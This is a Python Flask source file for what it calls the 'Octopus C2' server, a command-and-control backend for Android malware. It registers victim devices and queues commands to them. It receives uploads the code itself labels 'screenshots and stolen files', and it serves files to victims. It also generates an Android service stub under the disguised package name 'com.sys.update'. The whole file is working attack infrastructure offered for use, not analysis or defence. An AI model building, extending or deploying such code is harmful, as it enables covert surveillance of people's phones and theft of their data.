# filename: app.py
# ==============================================================================
#  OCTOPUS C2 SERVER v14.0 - ULTIMATE PROFESSIONAL EDITION
#  Features: Multi-threading, SQLite Concurrency Fix, socket.io, Admin Panel
# ==============================================================================

import os
import json
import sqlite3
import base64
import time
import threading
import logging
import shutil
from datetime import datetime, timedelta
from flask import Flask, request, jsonify, send_file, render_template_string, abort
from flask_cors import CORS
from flask_socketio import SocketIO, emit

# --- System Configuration ---
APP_NAME = "Octopus Ultimate C2"
VERSION = "14.0"
BASE_DIR = os.path.dirname(os.path.abspath(__file__))

# Define Directories
DB_PATH = os.path.join(BASE_DIR, "octopus.db")
LOGS_DIR = os.path.join(BASE_DIR, "logs")
UPLOADS_DIR = os.path.join(BASE_DIR, "uploads")
DOWNLOADS_DIR = os.path.join(BASE_DIR, "public_downloads") # Files sent TO victim
PAYLOADS_DIR = os.path.join(BASE_DIR, "payloads")

# Ensure ecosystem existence
for d in [LOGS_DIR, UPLOADS_DIR, DOWNLOADS_DIR, PAYLOADS_DIR]:
    os.makedirs(d, exist_ok=True)

# Logging Configuration
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s [%(levelname)s] %(message)s',
    handlers=[
        logging.FileHandler(os.path.join(LOGS_DIR, "server.log")),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger("OctopusCore")

# Flask & SocketIO Setup
app = Flask(__name__)
app.config['SECRET_KEY'] = os.urandom(64)
app.config['MAX_CONTENT_LENGTH'] = 1024 * 1024 * 1024 * 2  # 2GB Upload Limit
CORS(app, resources={r"/*": {"origins": "*"}})

# Async mode threading allows background tasks without blocking
socketio = SocketIO(app, cors_allowed_origins="*", async_mode='threading', ping_timeout=60)

# ==============================================================================
#  DATABASE LAYER (Optimized for High Concurrency)
# ==============================================================================
class Database:
    def __init__(self, path):
        self.path = path
        self._init_db()

    def get_conn(self):
        # Timeout=30 prevents "database is locked" errors under load
        conn = sqlite3.connect(self.path, timeout=30.0, check_same_thread=False)
        conn.row_factory = sqlite3.Row
        return conn

    def _init_db(self):
        conn = self.get_conn()
        cur = conn.cursor()
        
        # 1. Devices Table
        cur.execute('''
            CREATE TABLE IF NOT EXISTS devices (
                id TEXT PRIMARY KEY,
                model TEXT,
                android_version TEXT,
                ip_address TEXT,
                battery_level INTEGER DEFAULT 0,
                last_seen TIMESTAMP,
                status TEXT DEFAULT 'offline',
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        ''')

        # 2. Commands Table
        cur.execute('''
            CREATE TABLE IF NOT EXISTS commands (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                device_id TEXT,
                type TEXT,
                payload TEXT,
                status TEXT DEFAULT 'pending',
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                FOREIGN KEY(device_id) REFERENCES devices(id)
            )
        ''')

        # 3. Files Table
        cur.execute('''
            CREATE TABLE IF NOT EXISTS files (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                device_id TEXT,
                filename TEXT,
                file_type TEXT,
                file_size INTEGER,
                path TEXT,
                uploaded_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        ''')
        
        conn.commit()
        conn.close()
        logger.info("Database Schema Initialized Successfully.")

    def register_device(self, data, ip):
        conn = self.get_conn()
        try:
            now = datetime.now().isoformat()
            cur = conn.cursor()
            cur.execute('''
                INSERT INTO devices (id, model, android_version, ip_address, battery_level, last_seen, status)
                VALUES (?, ?, ?, ?, ?, ?, 'online')
                ON CONFLICT(id) DO UPDATE SET
                    model=excluded.model,
                    android_version=excluded.android_version,
                    ip_address=excluded.ip_address,
                    battery_level=excluded.battery_level,
                    last_seen=excluded.last_seen,
                    status='online'
            ''', (
                data.get('device_id'),
                data.get('model', 'Unknown Device'),
                data.get('version', 'Unknown OS'),
                ip,
                data.get('battery', 0),
                now
            ))
            conn.commit()
            return True
        except Exception as e:
            logger.error(f"DB Register Error: {e}")
            return False
        finally:
            conn.close()

    def update_heartbeat(self, device_id):
        conn = self.get_conn()
        try:
            now = datetime.now().isoformat()
            conn.execute("UPDATE devices SET last_seen = ?, status = 'online' WHERE id = ?", (now, device_id))
            conn.commit()
        except Exception as e:
            logger.error(f"DB Heartbeat Error: {e}")
        finally:
            conn.close()

    def get_pending_commands(self, device_id):
        conn = self.get_conn()
        try:
            cur = conn.cursor()
            cur.execute("SELECT id, type, payload FROM commands WHERE device_id = ? AND status = 'pending'", (device_id,))
            rows = cur.fetchall()
            cmds = []
            for row in rows:
                cmds.append({
                    "id": row['id'],
                    "type": row['type'],
                    "data": json.loads(row['payload']) if row['payload'] else {}
                })
                # Auto-mark as sent
                conn.execute("UPDATE commands SET status = 'sent' WHERE id = ?", (row['id'],))
            conn.commit()
            return cmds
        finally:
            conn.close()

    def add_command(self, device_id, cmd_type, payload):
        conn = self.get_conn()
        try:
            conn.execute("INSERT INTO commands (device_id, type, payload) VALUES (?, ?, ?)",
                         (device_id, cmd_type, json.dumps(payload)))
            conn.commit()
            return True
        finally:
            conn.close()

    def get_all_devices(self):
        conn = self.get_conn()
        try:
            cur = conn.cursor()
            cur.execute("SELECT * FROM devices ORDER BY last_seen DESC")
            return [dict(row) for row in cur.fetchall()]
        finally:
            conn.close()

    def save_file_record(self, device_id, filename, file_type, size, path):
        conn = self.get_conn()
        try:
            conn.execute("INSERT INTO files (device_id, filename, file_type, file_size, path) VALUES (?, ?, ?, ?, ?)",
                         (device_id, filename, file_type, size, path))
            conn.commit()
        finally:
            conn.close()

# Initialize DB
db = Database(DB_PATH)

# ==============================================================================
#  BACKGROUND WATCHDOG
# ==============================================================================
def watchdog_service():
    """Monitors device health and marks offline devices."""
    while True:
        try:
            time.sleep(60) # Run every 60 seconds
            limit = datetime.now() - timedelta(minutes=2) # 2 mins timeout
            conn = db.get_conn()
            conn.execute("UPDATE devices SET status = 'offline' WHERE last_seen < ?", (limit.isoformat(),))
            conn.commit()
            conn.close()
        except Exception as e:
            logger.error(f"Watchdog Error: {e}")

threading.Thread(target=watchdog_service, daemon=True).start()

# ==============================================================================
#  API ENDPOINTS (Used by Python Client & Payload)
# ==============================================================================

@app.route('/control', methods=['GET'])
def health_check():
    """Used by client to wake up server"""
    return jsonify({"status": "active", "server_time": int(time.time())})

@app.route('/api/connect', methods=['POST'])
def api_connect():
    """Device registration"""
    data = request.get_json(silent=True) or {}
    ip = request.remote_addr
    if db.register_device(data, ip):
        # Notify connected WebSocket clients (Admin Panel)
        socketio.emit('device_update', {'id': data.get('device_id'), 'status': 'connected'})
        return jsonify({"status": "success"})
    return jsonify({"status": "error"}), 500

@app.route('/api/heartbeat', methods=['POST'])
def api_heartbeat():
    """Payload polling for commands"""
    data = request.get_json(silent=True) or {}
    did = data.get('device_id')
    if did:
        db.update_heartbeat(did)
        cmds = db.get_pending_commands(did)
        return jsonify({"status": "ok", "commands": cmds})
    return jsonify({"status": "error"}), 400

@app.route('/api/command', methods=['POST'])
def api_command():
    """Admin sending command to device"""
    data = request.get_json(silent=True) or {}
    did = data.get('device_id')
    ctype = data.get('type')
    payload = data.get('payload', {})
    
    if did and ctype:
        db.add_command(did, ctype, payload)
        return jsonify({"status": "queued"})
    return jsonify({"status": "error"}), 400

@app.route('/api/upload', methods=['POST'])
def api_upload():
    """Receives screenshots and stolen files"""
    try:
        data = request.get_json(silent=True)
        if data and 'data' in data:
            did = data.get('device_id', 'unknown')
            file_type = data.get('type', 'file')
            
            # 1. Decode Data
            b64 = data['data']
            if ',' in b64: b64 = b64.split(',')[1]
            try:
                file_bytes = base64.b64decode(b64)
            except:
                return jsonify({"error": "bad_base64"}), 400
            
            # 2. Sanitize Filename
            original_name = data.get('filename', f"{int(time.time())}.bin")
            safe_name = f"{file_type}_{did}_{original_name}".replace("/", "_").replace("\\", "_")
            if 'screenshot' in file_type:
                safe_name = f"screenshot_{did}_{int(time.time())}.jpg"
            
            save_path = os.path.join(UPLOADS_DIR, safe_name)
            
            # 3. Save File
            with open(save_path, "wb") as f:
                f.write(file_bytes)
            
            # 4. Record DB & Notify
            db.save_file_record(did, safe_name, file_type, len(file_bytes), save_path)
            
            logger.info(f"Received {file_type}: {safe_name}")
            return jsonify({"status": "success", "url": f"/uploads/{safe_name}"})
            
    except Exception as e:
        logger.error(f"Upload Error: {e}")
        return jsonify({"error": str(e)}), 500
    return jsonify({"error": "invalid_request"}), 400

@app.route('/api/devices_list', methods=['GET'])
def api_devices_list():
    """Returns list for Python Client"""
    return jsonify(db.get_all_devices())

@app.route('/api/generate_apk', methods=['POST'])
def api_generate_apk():
    """Generates Stub Code"""
    data = request.get_json() or {}
    pkg = data.get('package_name', 'com.sys.update')
    code = f"""
package {pkg};
// Octopus Android Stub
// Server: {request.host_url}
import android.app.Service;
import android.content.Intent;
import android.os.IBinder;

public class MainService extends Service {{
    private final String SERVER = "{request.host_url}api/";
    // Implementation of HTTP requests required here
    // Use OkHttp or basic HttpURLConnection
    @Override
    public IBinder onBind(Intent intent) {{ return null; }}
}}
"""
    return jsonify({"status": "success", "code": code})

# --- File Serving ---
@app.route('/uploads/<path:filename>')
def serve_uploads(filename):
    return send_file(os.path.join(UPLOADS_DIR, filename))

@app.route('/send/<path:filename>')
def serve_public_file(filename):
    # This serves files from DOWNLOADS_DIR to victims
    return send_file(os.path.join(DOWNLOADS_DIR, filename), as_attachment=True)

# ==============================================================================
#  WEB ADMIN PANEL (Alternative to Python Client)
# ==============================================================================
@app.route('/admin')
def admin_panel():
    devices = db.get_all_devices()
    rows = ""
    for d in devices:
        color = "success" if d['status'] == 'online' else "danger"
        rows += f"""
        <tr>
            <td>{d['id']}</td>
            <td>{d['model']}</td>
            <td>{d['ip_address']}</td>
            <td><span class="badge bg-{color}">{d['status']}</span></td>
        </tr>"""
        
    html = f"""
    <!DOCTYPE html>
    <html>
    <head><link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet"></head>
    <body class="bg-dark text-light p-5">
        <h1>🐙 Octopus Web Admin</h1>
        <table class="table table-dark table-hover mt-4">
            <thead><tr><th>ID</th><th>Model</th><th>IP</th><th>Status</th></tr></thead>
            <tbody>{rows}</tbody>
        </table>
    </body>
    </html>
    """
    return render_template_string(html)

# ==============================================================================
#  MAIN EXECUTION
# ==============================================================================
if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    logger.info(f"Server starting on port {port}...")
    # Allow unsafe werkzeug is needed for some PaaS environments like Railway/Heroku
    socketio.run(app, host='0.0.0.0', port=port, allow_unsafe_werkzeug=True)
